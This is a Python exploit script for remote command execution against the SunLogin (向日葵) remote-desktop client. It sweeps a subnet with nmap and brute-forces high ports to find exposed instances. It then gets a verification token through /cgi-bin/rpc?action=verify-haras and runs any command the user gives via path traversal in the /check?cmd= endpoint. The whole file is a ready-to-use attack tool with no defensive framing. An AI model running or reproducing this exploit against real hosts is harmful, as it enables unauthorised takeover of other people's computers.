#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import random
import nmap
import re
from multiprocessing import Process, Queue
import datetime
import argparse

def banner():
    print("""
____  _   _ _   _ _     ___   ____ ___ _   _       ____   ____ _____ 
/ ___|| | | | \ | | |   / _ \ / ___|_ _| \ | |     |  _ \ / ___| ____|
\___ \| | | |  \| | |  | | | | |  _ | ||  \| |_____| |_) | |   |  _|  
 ___) | |_| | |\  | |__| |_| | |_| || || |\  |_____|  _ <| |___| |___ 
|____/ \___/|_| \_|_____\___/ \____|___|_| \_|     |_| \_\\____|_____|                                                    
                        向日葵RCE
                                                    BY:白色
    """)
parser = argparse.ArgumentParser(description='python3 sunloginrce.py -s 192.168.10.0/24')
# parser.add_argument(help='python3 sunloginrce.py -s 192.168.10.0/24')
# parser.add_argument(help='python3 sunloginrce.py -s 192.168.10.20')
# parser.add_argument(help='python3 sunloginrce.py -i 192.168.10.20 -c "whoami"')

parser.add_argument('-s', type=str,help='scanning IP:192.168.1.1、192.168.1.0/24、192.168.1.0/16',default="")
parser.add_argument('-i', type=str,help='ip',default="")
parser.add_argument('-p', type=str,help='port',default="")
parser.add_argument('-c', type=str,help='command',default="")
args = parser.parse_args()

start = datetime.datetime.now()
user_agent = [
    'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)',
    'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'
]
headers = {
    "User-Agent": random.choice(user_agent),
    "Content-Type":"application/x-www-form-urlencoded",
    'Connection': 'close',
    'Cookie':'CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3'
}
def scan1(_):
    session = requests.Session()
    nm = nmap.PortScanner()
    nm.scan(args.s, arguments='-sn -PE -n')
    for host in nm.all_hosts():
        print("存活:"+host+"\n"+"爆破端口中，请稍等.....")
        for i in range(39999,50000):
            url = "http://"+host+":"+str(i)
            try:
                html=session.get(url,headers=headers,timeout=0.01).text
                pattern =re.findall(r'Verification failure',html)[0]
                if pattern=="Verification failure":
                    re_ip =re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}',url)[0]
                    print("[+]存在向日葵远程RCE: "+re_ip)
                    break
                else:
                    print("[-]不存在向日葵远程rce:"+url)
            except Exception as e:
                pass
def scan2(_):
    session = requests.Session()
    nm = nmap.PortScanner()
    nm.scan(args.s, arguments='-sn -PE -n -T5')
    for host in nm.all_hosts():
        for i in range(50001,65535):
            url = "http://"+host+":"+str(i)
            try:
                html=session.get(url,headers=headers,timeout=0.01).text
                pattern =re.findall(r'Verification failure',html)[0]
                if pattern=="Verification failure":
                    re_ip =re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}',url)[0]
                    print("[+]存在向日葵远程RCE: "+re_ip)
                    break
                else:
                    print("[-]不存在向日葵远程rce:"+url)
            except Exception as e:
                pass  
def rce(_):
    url = "http://"+args.i+":"+args.p+"/cgi-bin/rpc?action=verify-haras"
    session = requests.Session()
    try:
        rce_html=session.get(url,headers=headers,timeout=1)
    except Exception as e:
        pass
    url1 = "http://"+args.i+":"+args.p+"/check?cmd=ping..%2F..%2F"+args.c
    try:
        rce_html1=session.get(url1,headers=headers,timeout=40).text
        print(rce_html1+"[+]命令执行成功")
        pass
    except Exception as e:
        pass

if __name__ == '__main__':
    q = Queue()
    p1=Process(target=scan1,args=(q,))
    p2=Process(target=scan2,args=(q,))
    p3=Process(target=rce,args=(q,))
    p1.start()
    p2.start()
    p3.start()
    p1.join()
    p2.join()
    p3.join()
    end=datetime.datetime.now()
    banner()
    print("共用时",end-start) 
